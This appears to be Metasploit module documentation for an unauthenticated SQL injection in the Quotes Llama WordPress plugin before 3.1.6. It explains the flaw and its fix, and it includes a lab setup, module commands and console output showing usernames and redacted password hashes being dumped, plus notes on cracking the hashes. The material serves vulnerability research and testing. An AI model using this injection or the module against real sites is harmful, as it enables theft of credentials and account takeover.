## Vulnerable Application

The Quotes Llama plugin for WordPress before 3.1.6 is affected by an unauthenticated SQL injection in the
`select_search` AJAX action. The `sc` POST parameter selects the column to search on and is passed to
`$wpdb->prepare()` through a `%1s` placeholder.

WordPress only quotes bare `%s` placeholders. Numbered or formatted ones such as `%1s` or `%5s` are
interpolated unquoted for backward compatibility, which WordPress core itself documents in the
`$allow_unsafe_unquoted_parameters` property of `wp-includes/class-wpdb.php` with the comment
"Unquoted strings for backward compatibility (dangerous)". The attacker controlled column name therefore
reaches the `WHERE` clause as raw SQL.

The fix in 3.1.6 replaces the placeholder with `%i`, the identifier placeholder added in WordPress 6.2,
which wraps the value in backticks and doubles any internal ones:

```php
' WHERE %1s LIKE %s' . // 3.1.5, vulnerable
' WHERE %i LIKE %s' .  // 3.1.6, fixed
```

The handler is registered for anonymous visitors through `wp_ajax_nopriv_select_search` and its only gate is
a nonce. That nonce is public. The `mode="page"` template prints it on every author link, outside the
`is_user_logged_in()` check. With the plugin's default settings (`search_allow` is `false`) the search form is
not rendered for anonymous visitors at all, yet the nonce still leaks, so no configuration change is needed
for the target to be exploitable.

The injected value is still passed through `_real_escape()`, so single quotes are escaped and break the
statement. Because the value is interpolated without quotes, the module enables the `hex_encode_strings`
option of the SQLi mixin, which emits hex literals instead of quoted strings.

The original query selects nine columns and the first one is rendered back in the page, so the module wraps
the mixin's query as a subquery in the first column of a `UNION`.

### Setting up a vulnerable target

The vulnerable version of the plugin is available from the WordPress plugin repository.

```yaml
services:
  db:
    image: mariadb:11.4
    environment:
      MARIADB_ROOT_PASSWORD: example_root_password
      MARIADB_DATABASE: wordpress
      MARIADB_USER: wordpress
      MARIADB_PASSWORD: example_password

  wordpress:
    image: wordpress:7.0-php8.3-apache
    depends_on:
      - db
    ports:
      - 8080:80
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_NAME: wordpress
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: example_password
```

1. Start the environment with `docker compose up -d` and complete the WordPress installation at
   `http://localhost:8080`.
2. Install the vulnerable plugin version:

```bash
wget https://downloads.wordpress.org/plugin/quotes-llama.3.1.5.zip
unzip quotes-llama.3.1.5.zip
docker compose cp quotes-llama wordpress:/var/www/html/wp-content/plugins/
```

3. Activate Quotes Llama from the plugin screen in `wp-admin`. Leave every plugin option at its default.
4. Add at least one quote with an author name under the Quotes Llama admin screen. The author list is what
   leaks the nonce, so a quote without a name will not expose it.
5. Publish a page whose content is the shortcode `[quotes-llama mode="page"]`.

## Verification Steps

1. Set up a vulnerable target as described above.
2. Start `msfconsole`.
3. Do: `use auxiliary/gather/wp_quotes_llama_sqli`
4. Do: `set RHOSTS [ip]`
5. Do: `set RPORT 8080`
6. Optionally set `COUNT` to the number of accounts to retrieve.
7. Do: `run`
8. *Verify* that the module reports the plugin version, recovers the public nonce, confirms the injection and
   dumps usernames and password hashes from the `wp_users` table.

## Options

### COUNT

Number of rows to retrieve from the WordPress users table. Each additional row makes the injected query
longer, so very large values may be truncated by the application. Defaults to `5`.

### SHORTCODE_PATH

Path to a page that renders one of the plugin's shortcodes, relative to `TARGETURI`. When left empty the
module discovers the nonce automatically by reading the rendered content exposed by the REST API at
`/wp-json/wp/v2/pages` and `/wp-json/wp/v2/posts`. Set it only when the REST API is disabled or when the
shortcode lives on a page that the REST API does not return.

## Scenarios

### Quotes Llama 3.1.5 on WordPress 7.0.4 with MariaDB 11.4 in Docker

```
msf6 > use auxiliary/gather/wp_quotes_llama_sqli
msf6 auxiliary(gather/wp_quotes_llama_sqli) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/wp_quotes_llama_sqli) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(gather/wp_quotes_llama_sqli) > set COUNT 5
COUNT => 5
msf6 auxiliary(gather/wp_quotes_llama_sqli) > show options

Module options (auxiliary/gather/wp_quotes_llama_sqli):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   COUNT           5                yes       Number of user credentials to retrieve
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          127.0.0.1        yes       The target host(s)
   RPORT           8080             yes       The target port (TCP)
   SHORTCODE_PATH                   no        Path to a page rendering the quotes-llama shortcode. Discovered automatically when empty
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                yes       The base path to the wordpress application
   VHOST                            no        HTTP server virtual host


msf6 auxiliary(gather/wp_quotes_llama_sqli) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/quotes-llama/readme.txt
[*] Found version 3.1.5 in the plugin
[*] Plugin version check reported: The target appears to be vulnerable.
[*] Searching for a public nonce in /wp-json/wp/v2/pages
[+] Recovered public quotes_llama nonce: 0b9d499c51
[*] {SQLi} Executing (select 'uXUn4')
[*] {SQLi} Encoded to (select 0x7558556e34)
[+] The target is vulnerable. The injected query returned the expected value
[*] {SQLi} Executing (SELECT 6 FROM information_schema.tables WHERE table_name = 'wp_users')
[*] {SQLi} Encoded to (SELECT 6 FROM information_schema.tables WHERE table_name = 0x77705f7573657273)
[*] {WPSQLi} Retrieved default table prefix: 'wp_'
[*] {SQLi} Executing (select group_concat(GycaU) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) GycaU from wp_users limit 5) NW)
[*] {SQLi} Encoded to (select group_concat(GycaU) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x70,0)),ifnull(user_pass,repeat(0xa3,0))) as binary) GycaU from wp_users limit 5) NW)
[+] {WPSQLi} Credential for user 'labadmin' created successfully.
[+] {WPSQLi} Credential for user 'editor_demo' created successfully.
[+] {WPSQLi} Credential for user 'autor_demo' created successfully.
[+] {WPSQLi} Credential for user 'suscriptor_demo' created successfully.
[*] {WPSQLi} Dumped user data:
wp_users
========

    user_login       user_pass
    ----------       ---------
    autor_demo       $wp$2y$10$[hash redacted]
    editor_demo      $wp$2y$10$[hash redacted]
    labadmin         $wp$2y$10$[hash redacted]
    suscriptor_demo  $wp$2y$10$[hash redacted]

[+] Loot saved to: /root/.msf4/loot/20261009115847_default_127.0.0.1_wordpress.users_584642.txt
[*] {WPSQLi} Reporting host...
[*] {WPSQLi} Reporting service...
[*] {WPSQLi} Reporting vulnerability...
[+] {WPSQLi} Reporting completed successfully.
[*] Auxiliary module execution completed
```

The accounts above belong to a disposable laboratory container and were created only to populate the table.
The hash bodies are redacted because the contribution checklist asks for no hashes in code or documentation.
The `$wp$2y$` prefix is kept because it determines the cracking path described below.

By default, WordPress 6.8 and later create `$wp$2y$` hashes, which are bcrypt applied to an HMAC-SHA384
pre-hash of the password. Existing `$P$` phpass hashes stay in place until the user next logs in or changes
their password, so a 6.8 or later site can still return them. `Metasploit::Framework::Hashes.identify_hash`
does not recognize the `$wp$2y$` prefix yet, so those credentials are stored without a John the Ripper
format. John the Ripper has no native format for them either. Hashcat can crack them through its bridge
mode. The `$P$` phpass hashes are identified and cracked normally.

### Quotes Llama 3.1.6, the patched version

Against a patched target the automatic check stops at the version comparison and the module does not run the
injection.

```
msf6 auxiliary(gather/wp_quotes_llama_sqli) > check
[*] Checking /wp-content/plugins/quotes-llama/readme.txt
[*] Found version 3.1.6 in the plugin
[*] Plugin version check reported: The target is not exploitable.
[*] 127.0.0.1:8080 - The target is not exploitable.
```
